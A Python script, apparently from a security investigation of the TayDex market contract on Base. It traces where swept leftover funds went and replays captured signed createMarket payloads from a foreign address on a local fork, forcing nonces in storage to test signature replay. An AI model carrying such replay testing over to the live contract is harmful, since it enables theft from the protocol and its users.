#!/usr/bin/env python3
"""TayDex pass20b: (A) decode LeftoverSwept -> who gets `dest`; (B) actor-binding replay.
Fixed: strip the 4-byte selector before chunking calldata into words (previous pass misaligned
every word by one byte and produced garbage indices).
Read-only.
"""
import json, os, time, urllib.error, urllib.request

R = "http://127.0.0.1:8546"
C = "0x3ade22fa1ef5ac75437a3734d91ba588e54875dd"
TGT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "taydex")
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
from Crypto.Hash import keccak as _k
def keccak(b): h = _k.new(digest_bits=256); h.update(b); return h.digest()
def sig4(s): return keccak(s.encode()).hex()[:8]
def topic0(s): return "0x" + keccak(s.encode()).hex()

def http(url, data=None, tries=5):
    last = None
    for t in range(tries):
        try:
            req = urllib.request.Request(url, data=data,
                                         headers={"Content-Type": "application/json",
                                                  "User-Agent": UA})
            d = json.loads(urllib.request.urlopen(req, timeout=45).read())
            return d
        except urllib.error.HTTPError as e:
            try:    last = json.loads(e.read())
            except Exception: last = f"HTTP {e.code}"
        except Exception as e:
            last = str(e)
        time.sleep(1.5 + t)
    return last if isinstance(last, dict) else None

def rpc(m, p):
    return http(R, json.dumps({"jsonrpc": "2.0", "id": 1, "method": m, "params": p}).encode()) or {}

def describe(r):
    if "error" in r:
        err = r["error"]
        if not isinstance(err, dict):
            return str(err)
        d = err.get("data"); msg = err.get("message", "")
        if isinstance(d, str) and d.startswith("0x08c379a0"):
            ln = int(d[10:74], 16)
            return f'Error("{bytes.fromhex(d[74:74+ln*2]).decode("utf-8","replace")}")'
        if isinstance(d, str) and len(d) >= 10:
            return f"{msg} [custom 0x{d[2:10]}]"
        if d is None:
            return f"{msg} (EMPTY data)"
        return str(msg)
    return "SUCCESS -> " + str(r.get("result"))[:70]

def strip_words(inp):
    """inp includes '0x' + 8-char selector. Strip BOTH before chunking."""
    return [inp[10:][i*64:(i+1)*64] for i in range(len(inp[10:])//64)]

OWNER = "0xef869234bb919bbde0f44d98912e87d1ce0463f8"

# ================= A. LeftoverSwept =================
print("=" * 96)
print("A. LeftoverSwept -- where did the swept dust go?")
print("=" * 96)
T = topic0("LeftoverSwept(uint256,uint16,address,uint256)")
SWEEPS = [
    ("market 24", "0xe6e6e9522cc6d557f153bc9fad20b33968276262ed6f0a2bcb3398b110270dbb"),
    ("market 1",  "0xc46c02d0914807d84437c3afa1731480d2ebc0ca111fe38e57d545e0ac7ec742"),
    ("market 3",  "0xfa5acd42641f6efc6a95acf115c5f6fdd0215a38be452d44fe014c7a31f81163"),
]
for label, txh in SWEEPS:
    d = http(f"https://base.blockscout.com/api/v2/transactions/{txh}/logs")
    items = (d or {}).get("items") if isinstance(d, dict) else None
    if items is None:
        # fall back: v2 tx detail
        d = http(f"https://base.blockscout.com/api/v2/transactions/{txh}")
        items = (d or {}).get("logs") if isinstance(d, dict) else None
    print(f"\n  [{label}] {txh}")
    if not items:
        print(f"      no logs via Blockscout: {str(d)[:120]}")
        continue
    for lg in items:
        tops = lg.get("topics") or []
        if tops and tops[0].lower() == T.lower():
            mid = int(tops[1], 16)
            oi = int(tops[2], 16)
            dest = "0x" + tops[3][-40:]
            dec = lg.get("decoded") or {}
            params = {p.get("name"): p.get("value") for p in (dec.get("parameters") or [])}
            print(f"      LeftoverSwept(marketId={mid}, optionIndex={oi})")
            print(f"        dest   = {dest}")
            print(f"        amount = {params.get('amount')}")
            print(f"        dest == owner ?        {dest.lower() == OWNER}")
            print(f"        dest == feeRecipient ? {dest.lower() == '0xc0b085c1a5514d8541adcb105aa7e6e8e5bc74ed'}")
        else:
            print(f"      [log] topic0={tops[0] if tops else '?'}")

# ================= B. replay =================
print("\n" + "=" * 96)
print("B. ACTOR-BINDING REPLAY on the fork")
print("=" * 96)
cands = json.load(open(os.path.join(TGT, "pass19_createmarket_txs.json")))
picks = []
for c in cands:
    try:
        wd = strip_words(c["input"])
        off_p = int(wd[0], 16) // 32
        off_sig = int(wd[1], 16) // 32
        endDate = int(wd[off_p], 16)
        off_arr = int(wd[off_p + 1], 16) // 32
        feeBps = int(wd[off_p + 2], 16)
        nonce = int(wd[off_p + 3], 16)
        deadline = int(wd[off_p + 4], 16)
        arrlen = int(wd[off_p + off_arr - 1], 16) if off_arr else None
        siglen = int(wd[off_sig], 16)
        picks.append({"hash": c["hash"], "from": c["from"], "nonce": nonce, "feeBps": feeBps,
                      "endDate": endDate, "deadline": deadline, "siglen": siglen,
                      "input": c["input"]})
    except Exception as e:
        print(f"    decode fail {c['hash'][:18]}…: {e}")

print(f"\n  decoded {len(picks)} payload(s)")
print(f"  {'payload':<22} {'from':<46} nonce  feeBps  siglen")
for p in picks:
    print(f"  {p['hash'][:20]}… {p['from']}  {p['nonce']:<6} {p['feeBps']:<7} {p['siglen']}")

json.dump(picks, open(os.path.join(TGT, "pass20_createmarket_decoded.json"), "w"), indent=1)

fr = [p for p in picks if p["nonce"] == 0]
print(f"\n  payloads with nonce == 0: {len(fr)}  (these are the ones a FRESH address could use)")

# also: the signer created exactly 3 markets and nonces(signer) == 3
print("\n  cross-check of the nonce counter:")
print(f"    signer created 3 markets (createMarket x3 from 0xb5932a15…), nonces(signer) = 3")
print("    -> the counter is consumed by msg.sender, not by the recovered signer")

FRESH = "0x00000000000000000000000000000000cafe0001"
test = (fr or picks)[:1]
for p in test:
    print(f"\n  REPLAY {p['hash']} (nonce={p['nonce']})")
    for label, who in [("original sender", p["from"]), ("fresh address", FRESH)]:
        n = rpc("eth_call", [{"to": C, "data": "0x" + sig4("nonces(address)") +
                              who.lower().replace("0x", "").rjust(64, "0")}, "latest"])
        nv = n.get("result")
        print(f"    [{label:<16}] {who}")
        print(f"        nonces() = {int(nv,16) if isinstance(nv,str) else nv}")
        rr = rpc("eth_call", [{"from": who, "to": C, "data": p["input"]}, "latest"])
        print(f"        replay   -> {describe(rr)}")
    # and with the fresh caller's nonce forced to the payload's value
    if p["nonce"] != 0:
        key = "0x" + keccak(bytes.fromhex(FRESH.lower().replace("0x","").rjust(64,"0"))
                            + (14).to_bytes(32, "big")).hex()
        rpc("anvil_setStorageAt", [C, key, "0x" + f"{p['nonce']:064x}"])
        rr = rpc("eth_call", [{"from": FRESH, "to": C, "data": p["input"]}, "latest"])
        print(f"    [fresh, nonce forced to {p['nonce']}] replay -> {describe(rr)}")

print("\n  --- key ---")
print("    signature/ECDSA error -> bound to actor (or scheme mismatch)")
print("    nonce Error(...)      -> check keys on msg.sender")
print("    USDC / transfer error -> signature ACCEPTED from a foreign address")
